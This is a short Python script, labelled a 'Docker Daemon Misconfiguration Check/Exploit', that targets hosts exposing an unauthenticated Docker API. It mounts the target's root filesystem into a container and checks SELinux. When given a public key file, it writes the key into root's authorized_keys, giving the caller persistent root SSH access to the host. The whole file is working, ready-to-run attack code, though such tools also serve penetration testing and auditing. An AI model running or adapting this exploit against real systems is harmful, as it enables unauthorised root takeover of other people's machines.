#!/usr/bin/env python

# Docker Daemon Misconfiguration Check/Exploit
# Author: Jordan Rodgers (com6056@gmail.com)


import argparse
import socket
import subprocess
import uuid


def arguments():
    parser = argparse.ArgumentParser(description='Docker Daemon Misconfiguration Check/Exploit')
    parser.add_argument('-H', '--host', help='IP or hostname of system to check/exploit', required=True)
    parser.add_argument('-p', '--port', help='Port to use to connect to the Docker daemon', required=False)
    parser.add_argument('-e', '--pubkey', help='Attempt to exploit the misconfigured host and place the given SSH public key for the root user', required=False)
    args = vars(parser.parse_args())
    if not args['port']:
        args['port'] = 2375
    return args['host'], args['port'], args['pubkey']


def check_port(host, port):
    print("Checking if the Docker daemon port provided is listening...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        print("Docker daemon port is listening!")
        return True
    else:
        print("Docker daemon port is not listening.")
        return False


def check_selinux(host, port, exploit_flag):
    selinux_cont_name = str(uuid.uuid4())
    print("Creating container to check the SELinux status on the target system...")
    selinux_status = subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'run', '--name', '{}'.format(selinux_cont_name), '-v/:/mnt', 'centos', 'chroot', '/mnt', '/bin/bash', '-c', 'getenforce']).decode('utf-8').strip()
    print("Cleaning up the container and image...")
    subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rm', '{}'.format(selinux_cont_name)])
    if not exploit_flag:
        subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rmi', 'centos'])
    if selinux_status == 'Permissive' or selinux_status == 'Disabled':
        print("SELinux is not enforcing on target system!")
        return True
    else:
        print("SELinux is enforcing on the target system.")


def exploit(host, port, pubkey_file):
    pubkey = open(pubkey_file, "r").read().strip()
    exploit_cont_name = str(uuid.uuid4())
    print("Creating container to copy the SSH key to the root account on the target system...")
    subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'run', '--name', '{}'.format(exploit_cont_name), '-v/:/mnt', 'centos', 'chroot', '/mnt', '/bin/bash', '-c', 'mkdir -p /root/.ssh; echo {} >> /root/.ssh/authorized_keys'.format(pubkey)])
    print("Cleaning up the container and image...")
    subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rm', '{}'.format(exploit_cont_name)])
    subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rmi', 'centos'])
    print("Your SSH key should now be in the authorized_keys file under the root user on the target system.")


if __name__ == "__main__":
    host, port, pubkey_file = arguments()
    port_open = check_port(host, port)
    if not port_open:
        print("Attempting to connect to the Docker daemon anyways...")
    try:
        selinux_disabled = check_selinux(host, port, pubkey_file)
        if selinux_disabled and pubkey_file:
            exploit(host, port, pubkey_file)
    except:
        print("Unable to check SELinux status and/or exploit the host.")
